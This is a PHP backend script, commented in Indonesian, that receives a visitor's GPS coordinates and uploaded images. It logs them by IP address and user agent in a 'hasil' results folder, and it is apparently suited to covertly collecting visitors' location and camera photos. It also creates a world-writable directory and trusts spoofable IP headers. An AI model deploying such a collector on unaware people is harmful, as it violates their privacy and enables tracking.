<?php
$UPLOAD_DIR = __DIR__ . "/hasil";
$LOC_FILE   = $UPLOAD_DIR . "/location.txt";
if (!is_dir($UPLOAD_DIR)) mkdir($UPLOAD_DIR, 0777, true);

header('Content-Type: application/json; charset=utf-8');

// Ambil IP client
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

$ip      = str_replace([".", ":"], "-", getClientIP());
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

/**
 * 📍 MODE 1: Hanya kirim lokasi (JSON, tanpa file)
 */
if (!isset($_FILES['file'])) {
    $raw  = file_get_contents("php://input");
    $data = json_decode($raw, true);

    if (!$data || !isset($data['lat'], $data['lon'])) {
        http_response_code(400);
        echo json_encode(["status"=>"error","message"=>"Data lokasi tidak valid"]);
        exit;
    }

    $accuracy = $data['accuracy'] ?? '';
    $time     = $data['time'] ?? date('c');

    $newLine = sprintf(
        "IP: %s Lat: %s Lon: %s Accuracy: %sm Time: %s User-Agent: %s",
        $ip,
        $data['lat'],
        $data['lon'],
        $accuracy,
        $time,
        $userAgent
    );

    $lines = file_exists($LOC_FILE) ? file($LOC_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
    $found = false;
    foreach ($lines as &$line) {
        if (strpos($line, "IP: $ip") === 0) {
            $line = $newLine;
            $found = true;
            break;
        }
    }
    unset($line);
    if (!$found) $lines[] = $newLine;

    file_put_contents($LOC_FILE, implode(PHP_EOL, $lines) . PHP_EOL);

    echo json_encode([
        "status"=>"ok",
        "mode"  => "location",
        "ip"    => $ip,
        "lat"   => $data['lat'],
        "lon"   => $data['lon'],
        "accuracy" => $accuracy,
        "time"  => $time,
        "useragent" => $userAgent
    ]);
    exit;
}

/**
 * 📷 MODE 2: Upload gambar (FormData)
 */
if ($_FILES['file']['error'] !== 0) {
    http_response_code(400);
    echo json_encode(["status"=>"error","message"=>"Upload gagal"]);
    exit;
}

$tmp = $_FILES['file']['tmp_name'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

$allowed_ext  = ['jpg','jpeg','png','gif','webp'];
$allowed_mime = ['image/jpeg','image/png','image/gif','image/webp'];
$mime = mime_content_type($tmp);

if (!in_array($ext, $allowed_ext) || !in_array($mime, $allowed_mime)) {
    http_response_code(400);
    echo json_encode(["status"=>"error","message"=>"File bukan gambar valid"]);
    exit;
}

// Ambil data tambahan dari FormData (jika ada)
$lat       = $_POST['lat'] ?? '';
$lon       = $_POST['lon'] ?? '';
$accuracy  = $_POST['accuracy'] ?? '';
$clientTime= $_POST['time'] ?? null;
$timestamp = $clientTime ? strtotime($clientTime) : time();

$filename = $UPLOAD_DIR . "/" . $ip . "_" . $timestamp . "." . $ext;

if (move_uploaded_file($tmp, $filename)) {
    // Simpan juga info ke location.txt jika ada lat/lon
    if ($lat && $lon) {
        $locLine = sprintf(
            "IP: %s Lat: %s Lon: %s Accuracy: %sm Time: %s User-Agent: %s",
            $ip,
            $lat,
            $lon,
            $accuracy,
            $clientTime ?: date('c'),
            $userAgent
        );

        $lines = file_exists($LOC_FILE) ? file($LOC_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
        $found = false;
        foreach ($lines as &$line) {
            if (strpos($line, "IP: $ip") === 0) {
                $line = $locLine;
                $found = true;
                break;
            }
        }
        unset($line);
        if (!$found) $lines[] = $locLine;

        file_put_contents($LOC_FILE, implode(PHP_EOL, $lines) . PHP_EOL);
    }

    echo json_encode([
        "status"   => "ok",
        "mode"     => "upload",
        "file"     => basename($filename),
        "ip"       => $ip,
        "timestamp"=> $timestamp,
        "useragent"=> $userAgent
    ]);
} else {
    http_response_code(500);
    echo json_encode(["status"=>"error","message"=>"Gagal simpan file"]);
}